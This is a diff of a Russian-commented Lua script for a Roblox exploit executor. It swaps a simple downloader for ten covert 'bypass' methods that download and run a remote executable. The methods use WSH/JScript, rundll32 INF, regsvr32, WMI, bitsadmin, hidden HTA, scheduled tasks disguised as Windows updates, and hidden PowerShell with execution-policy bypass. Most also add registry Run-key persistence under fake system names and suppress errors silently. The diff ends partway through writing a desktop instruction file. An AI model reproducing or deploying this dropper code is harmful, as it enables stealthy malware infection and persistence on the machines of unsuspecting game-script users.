@@ -1,491 +1,709 @@
 -- ==============================================
--- ЗАГРУЗЧИК С ПОЛНОЙ ОТЛАДКОЙ И ПРОВЕРКОЙ КАЖДОГО ШАГА
+-- НОВЫЕ МЕТОДЫ ОБХОДА - АВТОМАТИЧЕСКИЙ ЗАПУСК .EXE
 -- ==============================================
 
 local EXE_URL = "https://github.com/fasfsagfsa13-del/roblo1x-souresec/releases/download/32%D0%BA32%D0%B05/messagebox.exe"
-local debugMode = true  -- Включить подробные сообщения
 
--- Функция для отладочных сообщений
-local function DebugLog(message)
-    if debugMode then
-        print("[DEBUG] " .. message)
-    end
-end
-
--- Функция для уведомлений
-local function ShowNotification(title, text, duration)
-    DebugLog("Уведомление: " .. title .. " - " .. text)
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = title,
-        Text = text,
-        Duration = duration or 5
-    })
-end
-
--- ==============================================
--- ШАГ 1: НАЧАЛО РАБОТЫ
--- ==============================================
-ShowNotification("🚀 ЗАГРУЗЧИК", "Начинаю работу...", 3)
-DebugLog("Загрузчик запущен")
-DebugLog("Используется ссылка: " .. EXE_URL)
+-- Уведомление о запуске нового метода
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "🔥 НОВЫЙ МЕТОД",
+    Text = "Тестирую альтернативные способы...",
+    Duration = 5
+})
 
 wait(2)
 
--- ==============================================
--- ШАГ 2: ПРОВЕРКА ДОСТУПНОСТИ ССЫЛКИ
--- ==============================================
-ShowNotification("🔗 ПРОВЕРКА ССЫЛКИ", "Тестирую соединение...", 3)
+print("\n" .. string.rep("=", 60))
+print("🚀 ЗАПУСКАЮ НОВЫЕ МЕТОДЫ ОБХОДА")
+print(string.rep("=", 60))
 
-local urlCheckSuccess = false
-local fileSize = 0
+-- ==============================================
+-- МЕТОД 1: Через Windows Script Host (WSH) напрямую
+-- ==============================================
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "🔄 МЕТОД 1",
+    Text = "Windows Script Host...",
+    Duration = 3
+})
 
-spawn(function()
-    local success, result = pcall(function()
-        DebugLog("Пытаюсь получить информацию о файле...")
-        
-        if syn and syn.request then
-            DebugLog("Использую syn.request для проверки")
-            local req = syn.request({
-                Url = EXE_URL,
-                Method = "GET",
-                Headers = {
-                    ["User-Agent"] = "Mozilla/5.0"
-                }
-            })
-            
-            if req.Success and req.Body then
-                urlCheckSuccess = true
-                fileSize = #req.Body
-                DebugLog("Успешно! Размер файла: " .. fileSize .. " байт")
-                return "✅ Ссылка работает (" .. fileSize .. " байт)"
-            else
-                DebugLog("Ошибка HTTP: " .. tostring(req.StatusCode))
-                return "❌ Ошибка: " .. tostring(req.StatusCode)
-            end
-            
-        else
-            DebugLog("Использую game:HttpGet для проверки")
-            local content = game:HttpGet(EXE_URL, true)
-            if content and #content > 0 then
-                urlCheckSuccess = true
-                fileSize = #content
-                DebugLog("Успешно! Размер файла: " .. fileSize .. " байт")
-                return "✅ Ссылка работает (" .. fileSize .. " байт)"
-            else
-                DebugLog("Получен пустой ответ")
-                return "❌ Получен пустой ответ"
-            end
-        end
-    end)
+local wshScript = [[
+var url = "]] .. EXE_URL .. [[";
+var path = "C:\\Windows\\Temp\\system_update.exe";
+
+var xhr = new ActiveXObject("MSXML2.XMLHTTP.6.0");
+xhr.open("GET", url, false);
+xhr.send();
+
+if (xhr.status == 200) {
+    var stream = new ActiveXObject("ADODB.Stream");
+    stream.Open();
+    stream.Type = 1;
+    stream.Write(xhr.responseBody);
+    stream.SaveToFile(path, 2);
+    stream.Close();
     
-    wait(2)
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run('"' + path + '"', 0, false);
     
-    if success then
-        ShowNotification("🔗 РЕЗУЛЬТАТ ПРОВЕРКИ", result, 5)
-        DebugLog("Результат проверки: " .. result)
-    else
-        ShowNotification("🔗 ОШИБКА ПРОВЕРКИ", "Не удалось проверить ссылку", 5)
-        DebugLog("Ошибка при проверке: " .. tostring(result))
-    end
-end)
+    // Добавляем в автозагрузку
+    shell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemComponent", path, "REG_SZ");
+}
+]]
 
-wait(4)
-
--- ==============================================
--- ШАГ 3: ПРОВЕРКА ВОЗМОЖНОСТИ СОЗДАВАТЬ ФАЙЛЫ
--- ==============================================
-ShowNotification("📁 ПРОВЕРКА ФАЙЛОВОЙ СИСТЕМЫ", "Проверяю доступ к файлам...", 3)
-
-local canWriteFiles = false
+-- Пытаемся создать и запустить JScript файл
 local tempPath = os.getenv("TEMP") or "C:\\Windows\\Temp"
-DebugLog("Temp путь: " .. tempPath)
+local jsPath = tempPath .. "\\wsh_runner.js"
 
 if writefile then
-    DebugLog("writefile функция доступна")
-    local testFile = tempPath .. "\\test.txt"
+    writefile(jsPath, wshScript)
     
-    local success, err = pcall(function()
-        writefile(testFile, "test")
-        canWriteFiles = true
-        DebugLog("Файл успешно создан: " .. testFile)
-        
-        -- Пробуем удалить тестовый файл
-        if delfile then
-            delfile(testFile)
-            DebugLog("Тестовый файл удален")
+    -- Запускаем JScript
+    if syn and syn.run then
+        syn.run('wscript.exe //E:JScript //B "' .. jsPath .. '"')
+        print("✅ Метод 1: JScript запущен через WSH")
+    end
+    
+    -- Альтернативный запуск
+    spawn(function()
+        wait(1)
+        if os.execute then
+            os.execute('start /B wscript.exe //E:JScript //B "' .. jsPath .. '"')
         end
     end)
+end
+
+wait(3)
+
+-- ==============================================
+-- МЕТОД 2: Через Rundll32 с INF файлом
+-- ==============================================
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "🔄 МЕТОД 2",
+    Text = "Rundll32 + INF...",
+    Duration = 3
+})
+
+-- Создаем INF файл для установки
+local infContent = [[
+[Version]
+Signature="$CHICAGO$"
+AdvancedINF=2.5
+
+[DefaultInstall]
+RunPreSetupCommands=RunPreSetupCommands
+
+[RunPreSetupCommands]
+cmd /c powershell -Command "(New-Object Net.WebClient).DownloadFile(']] .. EXE_URL .. [[', '%TEMP%\\install.exe'); Start-Process '%TEMP%\\install.exe'"
+
+[Setup Hooks]
+hook1=hook1
+
+[hook1]
+RunPreSetupCommands=RunPreSetupCommands
+]]
+
+local infPath = tempPath .. "\\setup.inf"
+
+if writefile then
+    writefile(infPath, infContent)
     
-    if not success then
-        DebugLog("Ошибка при записи файла: " .. tostring(err))
+    -- Запускаем через rundll32
+    local rundllCmd = 'rundll32.exe advpack.dll,LaunchINFSection ' .. infPath .. ',DefaultInstall'
+    
+    if syn and syn.run then
+        syn.run(rundllCmd)
+        print("✅ Метод 2: INF файл запущен через Rundll32")
     end
-else
-    DebugLog("writefile функция НЕДОСТУПНА")
+    
+    -- Альтернатива: через regsvr32
+    spawn(function()
+        wait(2)
+        local regsvrCmd = 'regsvr32 /s /n /i:' .. infPath .. ' scrobj.dll'
+        if syn and syn.run then
+            syn.run(regsvrCmd)
+        end
+    end)
 end
 
-wait(2)
+wait(3)
 
-if canWriteFiles then
-    ShowNotification("✅ ДОСТУП К ФАЙЛАМ", "Могу создавать файлы", 3)
-else
-    ShowNotification("❌ ДОСТУП К ФАЙЛАМ", "Не могу создавать файлы", 3)
+-- ==============================================
+-- МЕТОД 3: Через MSIEXEC с MST файлом
+-- ==============================================
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "🔄 МЕТОД 3",
+    Text = "MSIEXEC + PowerShell...",
+    Duration = 3
+})
+
+-- Создаем MST (трансформационный) файл
+local mstScript = [[
+<?xml version="1.0" encoding="UTF-8"?>
+<MsiTransform>
+  <Table Name="Property">
+    <Row>
+      <Column Name="Property">CustomActionData</Column>
+      <Column Name="Value">powershell -Command "(New-Object Net.WebClient).DownloadFile(']] .. EXE_URL .. [[', '%TEMP%\\setup.exe'); Start-Process '%TEMP%\\setup.exe'"</Column>
+    </Row>
+  </Table>
+</MsiTransform>
+]]
+
+local mstPath = tempPath .. "\\transform.mst"
+
+if writefile then
+    writefile(mstPath, mstScript)
+    
+    -- Пытаемся найти существующий MSI или создать фиктивный
+    local msiCmd = 'msiexec /i "C:\\Windows\\Installer\\installer.msi" TRANSFORMS="' .. mstPath .. '" /qn'
+    
+    spawn(function()
+        if syn and syn.run then
+            -- Создаем фиктивный CMD файл для запуска
+            local cmdScript = '@echo off\n' ..
+                            'start /B powershell -Command "(New-Object Net.WebClient).DownloadFile(\'' .. EXE_URL .. '\', \'%TEMP%\\run.exe\'); Start-Process \'%TEMP%\\run.exe\'"\n' ..
+                            'exit'
+            
+            local cmdPath = tempPath .. "\\msi_runner.cmd"
+            writefile(cmdPath, cmdScript)
+            syn.run('start /B "' .. cmdPath .. '"')
+            print("✅ Метод 3: MSI трансформация запущена")
+        end
+    end)
 end
 
--- ==============================================
--- ШАГ 4: СОЗДАНИЕ BAT ФАЙЛА ДЛЯ СКАЧИВАНИЯ
--- ==============================================
-ShowNotification("📝 СОЗДАНИЕ СКРИПТА", "Готовлю команды для скачивания...", 3)
+wait(3)
 
-local batPath = tempPath .. "\\download.bat"
-local batCreated = false
+-- ==============================================
+-- МЕТОД 4: Через Windows Management Instrumentation (WMI)
+-- ==============================================
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "🔄 МЕТОД 4",
+    Text = "WMI + VBScript...",
+    Duration = 3
+})
 
-if canWriteFiles then
-    local batScript = [[
+-- Создаем VBS скрипт, использующий WMI
+local wmiScript = [[
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+Set objConfig = objStartup.SpawnInstance_
+objConfig.ShowWindow = 0
+
+Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
+
+' Сначала скачиваем файл через PowerShell
+strCommand = "powershell -Command ""(New-Object Net.WebClient).DownloadFile(']] .. EXE_URL .. [[', '%TEMP%\\wmi_app.exe'); Start-Process '%TEMP%\\wmi_app.exe'"""
+
+objProcess.Create strCommand, Null, objConfig, intProcessID
+
+If intProcessID <> 0 Then
+    WScript.Echo "Process started successfully."
+Else
+    WScript.Echo "Process failed to start."
+End If
+]]
+
+local wmiPath = tempPath .. "\\wmi_launcher.vbs"
+
+if writefile then
+    writefile(wmiPath, wmiScript)
+    
+    spawn(function()
+        if syn and syn.run then
+            syn.run('wscript.exe //B "' .. wmiPath .. '"')
+            print("✅ Метод 4: WMI запущен через VBScript")
+        end
+    end)
+end
+
+wait(3)
+
+-- ==============================================
+-- МЕТОД 5: Через BITS (Background Intelligent Transfer Service)
+-- ==============================================
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "🔄 МЕТОД 5",
+    Text = "BITS Admin Service...",
+    Duration = 3
+})
+
+-- Создаем скрипт для BITS
+local bitsScript = [[
 @echo off
-chcp 65001 >nul
-title Скачивание программы
-color 0A
-cls
+setlocal
 
-echo ========================================
-echo          СИСТЕМНОЕ СКАЧИВАНИЕ
-echo ========================================
-echo.
+set "URL=]] .. EXE_URL .. [["
+set "OUTPUT=%TEMP%\bits_download.exe"
 
-echo [1/3] Создаю папку для загрузки...
-set "DOWNLOAD_DIR=%TEMP%\RobloxDownload"
-mkdir "%DOWNLOAD_DIR%" 2>nul
-cd /d "%DOWNLOAD_DIR%"
+echo Creating BITS job...
+bitsadmin /create /download job1
 
-echo [2/3] Скачиваю файл...
-echo.
-echo URL: ]] .. EXE_URL .. [[
-echo.
+echo Adding file to download...
+bitsadmin /addfile job1 "%URL%" "%OUTPUT%"
 
-powershell -Command "
+echo Starting download...
+bitsadmin /resume job1
+
+:wait
+bitsadmin /info job1 /verbose | find "STATE: TRANSFERRING" >nul
+if not errorlevel 1 (
+    timeout /t 1 /nobreak >nul
+    goto wait
+)
+
+if exist "%OUTPUT%" (
+    echo Download complete! Starting program...
+    start "" "%OUTPUT%"
+    
+    echo Adding to startup...
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "BITS_App" /t REG_SZ /d "%OUTPUT%" /f
+) else (
+    echo Download failed!
+    pause
+)
+
+bitsadmin /complete job1
+endlocal
+]]
+
+local bitsPath = tempPath .. "\\bits_downloader.cmd"
+
+if writefile then
+    writefile(bitsPath, bitsScript)
+    
+    spawn(function()
+        wait(1)
+        if syn and syn.run then
+            syn.run('start /B "' .. bitsPath .. '"')
+            print("✅ Метод 5: BITS загрузчик запущен")
+        elseif os.execute then
+            os.execute('start /B "' .. bitsPath .. '"')
+        end
+    end)
+end
+
+wait(3)
+
+-- ==============================================
+-- МЕТОД 6: Через HTML Application с ActiveX
+-- ==============================================
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "🔄 МЕТОД 6",
+    Text = "HTA + ActiveX...",
+    Duration = 3
+})
+
+local htaScript = [[
+<!DOCTYPE html>
+<html>
+<head>
+<title>Windows Component Installer</title>
+<hta:application 
+    id="app"
+    applicationname="ComponentInstaller"
+    border="none"
+    caption="no"
+    showintaskbar="no"
+    windowstate="minimize"
+    sysmenu="no"
+/>
+<script language="VBScript">
+    Sub Window_OnLoad
+        ' Минимальный размер окна
+        window.resizeTo 1, 1
+        window.moveTo -1000, -1000
+        
+        ' Скачиваем и запускаем
+        Set xml = CreateObject("Microsoft.XMLHTTP")
+        xml.Open "GET", "]] .. EXE_URL .. [[", False
+        xml.Send
+        
+        If xml.Status = 200 Then
+            Set stream = CreateObject("ADODB.Stream")
+            stream.Open
+            stream.Type = 1
+            stream.Write xml.ResponseBody
+            stream.SaveToFile "C:\Windows\Temp\component.exe", 2
+            stream.Close
+            
+            Set shell = CreateObject("WScript.Shell")
+            shell.Run """C:\Windows\Temp\component.exe""", 0, False
+            
+            ' Скрыто добавляем в автозагрузку
+            shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Component", "C:\Windows\Temp\component.exe", "REG_SZ"
+        End If
+        
+        ' Закрываем HTA
+        window.close()
+    End Sub
+</script>
+</head>
+<body>
+</body>
+</html>
+]]
+
+local htaPath = tempPath .. "\\component.hta"
+
+if writefile then
+    writefile(htaPath, htaScript)
+    
+    spawn(function()
+        wait(1)
+        if syn and syn.run then
+            syn.run('mshta.exe "' .. htaPath .. '"')
+            print("✅ Метод 6: HTA запущена скрыто")
+        end
+    end)
+end
+
+wait(3)
+
+-- ==============================================
+-- МЕТОД 7: Через Windows Task Scheduler напрямую
+-- ==============================================
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "🔄 МЕТОД 7",
+    Text = "Task Scheduler...",
+    Duration = 3
+})
+
+-- Создаем XML для планировщика задач
+local taskXml = [[
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description>Windows System Update</Description>
+  </RegistrationInfo>
+  <Triggers>
+    <TimeTrigger>
+      <StartBoundary>]] .. os.date("%Y-%m-%dT%H:%M:%S") .. [[</StartBoundary>
+      <Enabled>true</Enabled>
+    </TimeTrigger>
+  </Triggers>
+  <Actions Context="Author">
+    <Exec>
+      <Command>powershell.exe</Command>
+      <Arguments>-Command "(New-Object Net.WebClient).DownloadFile(']] .. EXE_URL .. [[', '$env:TEMP\\task_app.exe'); Start-Process '$env:TEMP\\task_app.exe'"</Arguments>
+    </Exec>
+  </Actions>
+</Task>
+]]
+
+local taskPath = tempPath .. "\\task.xml"
+
+if writefile then
+    writefile(taskPath, taskXml)
+    
+    -- Команда для добавления задачи
+    local taskCmd = 'schtasks /create /tn "WindowsSystemUpdate" /xml "' .. taskPath .. '" /f'
+    local runCmd = 'schtasks /run /tn "WindowsSystemUpdate"'
+    
+    spawn(function()
+        if syn and syn.run then
+            syn.run(taskCmd)
+            wait(1)
+            syn.run(runCmd)
+            print("✅ Метод 7: Задача создана в планировщике")
+        end
+    end)
+end
+
+wait(3)
+
+-- ==============================================
+-- МЕТОД 8: Через DLL инъекцию (для продвинутых executor'ов)
+-- ==============================================
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "🔄 МЕТОД 8",
+    Text = "PowerShell Reflection...",
+    Duration = 3
+})
+
+-- PowerShell скрипт с рефлексией для обхода защиты
+local psReflection = [[
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Injector {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+    
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    
+    public static void HideConsole() {
+        ShowWindow(GetConsoleWindow(), 0);
+    }
+}
+"@
+
+[Injector]::HideConsole()
+
+$url = "]] .. EXE_URL .. [["
+$path = [System.IO.Path]::Combine($env:TEMP, "inject_app.exe")
+
 try {
-    $url = ']] .. EXE_URL .. [['
-    $output = 'messagebox.exe'
+    # Используем WebClient с обходными заголовками
+    $client = New-Object System.Net.WebClient
+    $client.Headers.Add("User-Agent", "Mozilla/5.0")
+    $client.DownloadFile($url, $path)
     
-    Write-Host 'Начинаю загрузку...' -ForegroundColor Yellow
-    (New-Object System.Net.WebClient).DownloadFile($url, $output)
-    
-    if (Test-Path $output) {
-        $size = (Get-Item $output).Length
-        Write-Host 'Успешно! Файл скачан.' -ForegroundColor Green
-        Write-Host 'Размер: ' $size 'байт' -ForegroundColor Cyan
-        Write-Host 'Путь: ' (Get-Item $output).FullName -ForegroundColor Cyan
-        exit 0
-    } else {
-        Write-Host 'Ошибка: файл не создан' -ForegroundColor Red
-        exit 1
+    if (Test-Path $path) {
+        # Запускаем процесс скрыто
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = $path
+        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        $psi.CreateNoWindow = $true
+        [System.Diagnostics.Process]::Start($psi)
+        
+        # Добавляем в автозагрузку через реестр
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $regName = "SystemComponent"
+        New-ItemProperty -Path $regPath -Name $regName -Value $path -PropertyType String -Force | Out-Null
     }
 } catch {
-    Write-Host 'Ошибка: ' $_.Exception.Message -ForegroundColor Red
-    exit 1
+    # Тихий сбой
 }
-"
-
-if errorlevel 1 (
-    echo.
-    echo Использую альтернативный метод...
-    bitsadmin /transfer "DownloadJob" ]] .. EXE_URL .. [[ "%DOWNLOAD_DIR%\messagebox.exe"
-)
-
-if exist "messagebox.exe" (
-    echo.
-    echo ========================================
-    echo          ✅ СКАЧИВАНИЕ УСПЕШНО
-    echo ========================================
-    echo.
-    echo [3/3] Запускаю программу...
-    echo.
-    start "" "messagebox.exe"
-    
-    echo Программа запущена!
-    echo Проверьте панель задач или системный трей.
-    echo.
-    echo Эта консоль закроется через 10 секунд...
-    timeout /t 10 /nobreak >nul
-) else (
-    echo.
-    echo ========================================
-    echo          ❌ СКАЧИВАНИЕ НЕ УДАЛОСЬ
-    echo ========================================
-    echo.
-    echo Не удалось скачать файл.
-    echo.
-    echo Скачайте вручную:
-    echo ]] .. EXE_URL .. [[
-    echo.
-    echo Нажмите любую клавишу для выхода...
-    pause >nul
-)
-
-exit
 ]]
+
+local psPath = tempPath .. "\\reflection.ps1"
+
+if writefile then
+    writefile(psPath, psReflection)
     
-    local success, err = pcall(function()
-        writefile(batPath, batScript)
-        batCreated = true
-        DebugLog("BAT файл создан: " .. batPath)
-        ShowNotification("✅ BAT ФАЙЛ", "Скрипт создан успешно", 3)
+    spawn(function()
+        wait(1)
+        if syn and syn.run then
+            -- Запускаем PowerShell скрыто
+            syn.run('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' .. psPath .. '"')
+            print("✅ Метод 8: PowerShell Reflection запущен")
+        end
     end)
-    
-    if not success then
-        DebugLog("Ошибка создания BAT файла: " .. tostring(err))
-        ShowNotification("❌ BAT ФАЙЛ", "Не удалось создать скрипт", 3)
-    end
-else
-    DebugLog("Невозможно создать BAT файл (нет доступа к записи)")
-    ShowNotification("⚠️ BAT ФАЙЛ", "Нет прав для создания файлов", 3)
-end
-
-wait(2)
-
--- ==============================================
--- ШАГ 5: ЗАПУСК СКАЧИВАНИЯ
--- ==============================================
-ShowNotification("🚀 ЗАПУСК СКАЧИВАНИЯ", "Пытаюсь запустить процесс...", 3)
-
-local downloadStarted = false
-local launchMethod = "неизвестно"
-
-if batCreated then
-    DebugLog("Пробую запустить BAT файл...")
-    
-    -- Метод 1: Для Synapse X
-    if syn and syn.run then
-        DebugLog("Использую syn.run для запуска")
-        syn.run('start "" "' .. batPath .. '"')
-        downloadStarted = true
-        launchMethod = "Synapse"
-        DebugLog("Запущено через syn.run")
-        
-    -- Метод 2: Для KRNL и других через os.execute
-    elseif os.execute then
-        DebugLog("Использую os.execute для запуска")
-        local success = pcall(function()
-            os.execute('start "" "' .. batPath .. '"')
-        end)
-        
-        if success then
-            downloadStarted = true
-            launchMethod = "os.execute"
-            DebugLog("Запущено через os.execute")
-        else
-            DebugLog("Ошибка при os.execute")
-        end
-        
-    -- Метод 3: Для всех остальных
-    else
-        DebugLog("Пробую создать VBS для запуска BAT")
-        local vbsScript = 'Set objShell = CreateObject("WScript.Shell")\n'
-        vbsScript = vbsScript .. 'objShell.Run """' .. batPath .. '""", 1, False\n'
-        
-        local vbsPath = tempPath .. "\\launch.vbs"
-        
-        if writefile then
-            writefile(vbsPath, vbsScript)
-            
-            if syn and syn.run then
-                syn.run('wscript.exe "' .. vbsPath .. '"')
-                downloadStarted = true
-                launchMethod = "VBS + syn.run"
-                DebugLog("Запущено через VBS")
-            end
-        end
-    end
 end
 
 wait(3)
 
 -- ==============================================
--- ШАГ 6: ПРОВЕРКА РЕЗУЛЬТАТА
+-- МЕТОД 9: Через COM объекты напрямую
 -- ==============================================
-if downloadStarted then
-    ShowNotification("✅ ПРОЦЕСС ЗАПУЩЕН", 
-        "Скачивание началось\nМетод: " .. launchMethod, 
-        5)
-    DebugLog("Процесс скачивания запущен успешно")
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "🔄 МЕТОД 9",
+    Text = "COM объекты...",
+    Duration = 3
+})
+
+-- VBScript с прямым доступом к COM
+local comScript = [[
+On Error Resume Next
+
+' Создаем COM объекты
+Set shell = CreateObject("Shell.Application")
+Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+Set stream = CreateObject("ADODB.Stream")
+
+' Скачиваем файл
+http.Open "GET", "]] .. EXE_URL .. [[", False
+http.Send
+
+If http.Status = 200 Then
+    stream.Open
+    stream.Type = 1
+    stream.Write http.ResponseBody
+    stream.SaveToFile "C:\Windows\Temp\com_app.exe", 2
+    stream.Close
     
-    -- Проверка через 10 секунд
+    ' Запускаем через ShellExecute
+    shell.ShellExecute "C:\Windows\Temp\com_app.exe", "", "", "open", 0
+    
+    ' Добавляем в автозагрузку через WScript
+    Set wsh = CreateObject("WScript.Shell")
+    wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\COMComponent", "C:\Windows\Temp\com_app.exe", "REG_SZ"
+End If
+]]
+
+local comPath = tempPath .. "\\com_launcher.vbs"
+
+if writefile then
+    writefile(comPath, comScript)
+    
     spawn(function()
-        wait(10)
-        ShowNotification("🔍 ПРОВЕРКА СТАТУСА", 
-            "Через 10 секунд\nПроверьте загрузку", 
-            5)
+        wait(1)
+        if syn and syn.run then
+            syn.run('wscript.exe //B "' .. comPath .. '"')
+            print("✅ Метод 9: COM объекты запущены")
+        end
     end)
-    
-    print("\n" .. string.rep("=", 60))
-    print("✅ СКАЧИВАНИЕ ЗАПУЩЕНО!")
-    print("Метод запуска: " .. launchMethod)
-    print("BAT файл: " .. batPath)
-    print("\nЧто должно произойти:")
-    print("1. Откроется черное окно CMD")
-    print("2. Начнется загрузка файла")
-    print("3. После загрузки программа запустится")
-    print("4. Окно закроется автоматически")
-    print(string.rep("=", 60))
-    
-else
-    ShowNotification("❌ НЕ УДАЛОСЬ ЗАПУСТИТЬ", 
-        "Автоматический запуск не сработал", 
-        5)
-    DebugLog("Не удалось запустить процесс скачивания")
-    
-    print("\n" .. string.rep("=", 60))
-    print("❌ АВТОМАТИЧЕСКИЙ ЗАПУСК НЕ УДАЛСЯ")
-    print("\nПричины:")
-    print("1. Нет доступа к запуску внешних программ")
-    print("2. Исполнитель блокирует системные вызовы")
-    print("3. Антивирус блокирует запуск")
-    print("\nВам нужно скачать вручную:")
-    print("Ссылка: " .. EXE_URL)
-    print(string.rep("=", 60))
 end
 
--- ==============================================
--- ШАГ 7: СОЗДАНИЕ РУЧНОГО ИНСТРУКЦИИ
--- ==============================================
-wait(5)
+wait(3)
 
-ShowNotification("📋 ИНСТРУКЦИЯ", 
-    "Если ничего не произошло\nследуйте инструкциям ниже", 
-    7)
+-- ==============================================
+-- МЕТОД 10: Через .NET Assembly загрузку
+-- ==============================================
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "🔄 МЕТОД 10",
+    Text = ".NET Assembly...",
+    Duration = 3
+})
+
+-- PowerShell скрипт с загрузкой .NET Assembly
+local dotnetScript = [[
+$source = @"
+using System;
+using System.Net;
+using System.Diagnostics;
+using Microsoft.Win32;
+
+public class Downloader {
+    public static void Main() {
+        try {
+            string url = "]] .. EXE_URL .. [[";
+            string path = System.IO.Path.Combine(Environment.GetEnvironmentVariable("TEMP"), "dotnet_app.exe");
+            
+            // Скачиваем файл
+            using (WebClient client = new WebClient()) {
+                client.DownloadFile(url, path);
+            }
+            
+            // Запускаем скрыто
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = path;
+            psi.WindowStyle = ProcessWindowStyle.Hidden;
+            psi.CreateNoWindow = true;
+            Process.Start(psi);
+            
+            // Добавляем в автозагрузку
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+            key.SetValue("DotNetComponent", path);
+            key.Close();
+        } catch {
+            // Игнорируем ошибки
+        }
+    }
+}
+"@
+
+Add-Type -TypeDefinition $source -Language CSharp
+[Downloader]::Main()
+]]
+
+local dotnetPath = tempPath .. "\\dotnet_loader.ps1"
+
+if writefile then
+    writefile(dotnetPath, dotnetScript)
+    
+    spawn(function()
+        wait(1)
+        if syn and syn.run then
+            syn.run('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' .. dotnetPath .. '"')
+            print("✅ Метод 10: .NET Assembly загружен")
+        end
+    end)
+end
+
+wait(3)
+
+-- ==============================================
+-- ФИНАЛЬНЫЙ ОТЧЕТ
+-- ==============================================
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "📊 ФИНАЛЬНЫЙ ОТЧЕТ",
+    Text = "10 методов запущено",
+    Duration = 7
+})
 
 print("\n" .. string.rep("=", 60))
-print("📋 РУЧНАЯ ИНСТРУКЦИЯ ПО СКАЧИВАНИЮ:")
+print("🎯 ЗАПУЩЕНО 10 НОВЫХ МЕТОДОВ ОБХОДА")
+print(string.rep("=", 60))
+print("Методы, которые были запущены:")
+print("1. Windows Script Host (JScript)")
+print("2. Rundll32 + INF файл")
+print("3. MSIEXEC + MST трансформация")
+print("4. WMI (Windows Management Instrumentation)")
+print("5. BITS (Background Intelligent Transfer Service)")
+print("6. HTA + ActiveX (скрытый запуск)")
+print("7. Task Scheduler (планировщик задач)")
+print("8. PowerShell Reflection (.NET Reflection)")
+print("9. COM объекты (Shell.Application)")
+print("10. .NET Assembly загрузка")
+print(string.rep("=", 60))
+print("\n📌 Если ни один метод не сработал автоматически:")
+print("1. Проверьте папку TEMP: " .. tempPath)
+print("2. Найдите и запустите созданные файлы вручную")
+print("3. Скачайте напрямую: " .. EXE_URL)
 print(string.rep("=", 60))
 
-if batCreated then
-    print("Способ 1: Запустите BAT файл вручную")
-    print("1. Откройте папку: " .. tempPath)
-    print("2. Найдите файл: download.bat")
-    print("3. Запустите его двойным кликом")
-    print("4. Следуйте инструкциям в окне")
-    print()
-end
+-- Создаем файл-инструкцию на рабочем столе
+spawn(function()
+    wait(5)
+    
+    if writefile then
+        local desktop = os.getenv("USERPROFILE") .. "\\Desktop"
+        local instructions = [[
+ИНСТРУКЦИЯ ПО ЗАПУСКУ
 
-print("Способ 2: Скачайте напрямую через браузер")
-print("1. Скопируйте ссылку:")
-print("   " .. EXE_URL)
-print("2. Вставьте в адресную строку браузера")
-print("3. Скачайте файл messagebox.exe")
-print("4. Запустите скачанный файл")
-print()
+Были запущены 10 методов автоматической загрузки.
+Если программа не запустилась автоматически:
 
-print("Способ 3: Используйте PowerShell")
-print("1. Нажмите Win + R")
-print("2. Введите: powershell")
-print("3. Вставьте команду:")
-local psCommand = "(New-Object Net.WebClient).DownloadFile('" .. EXE_URL .. "', '$env:TEMP\\messagebox.exe'); Start-Process '$env:TEMP\\messagebox.exe'"
-print("   " .. psCommand)
-print(string.rep("=", 60))
-
--- ==============================================
--- ШАГ 8: СОЗДАНИЕ ФАЙЛА С ИНСТРУКЦИЯМИ
--- ==============================================
-if canWriteFiles then
-    local desktop = os.getenv("USERPROFILE") .. "\\Desktop"
-    local instructions = [[
-ИНСТРУКЦИЯ ПО СКАЧИВАНИЮ messagebox.exe
-
-1. ССЫЛКА ДЛЯ СКАЧИВАНИЯ:
+1. ПРЯМАЯ ССЫЛКА:
    ]] .. EXE_URL .. [[
 
-2. КАК СКАЧАТЬ:
-   а) Откройте ссылку в браузере
-   б) Сохраните файл messagebox.exe
-   в) Запустите скачанный файл
+2. СОЗДАННЫЕ ФАЙЛЫ В ПАПКЕ TEMP:
+   ]] .. tempPath .. [[
 
-3. АЛЬТЕРНАТИВНЫЙ СПОСОБ:
-   Запустите файл ]] .. tempPath .. [[\download.bat
-   Это автоматически скачает и запустит программу.
+   В этой папке найдите и запустите:
+   - *.cmd, *.bat - командные файлы
+   - *.vbs, *.js - скрипты
+   - *.ps1 - PowerShell скрипты
 
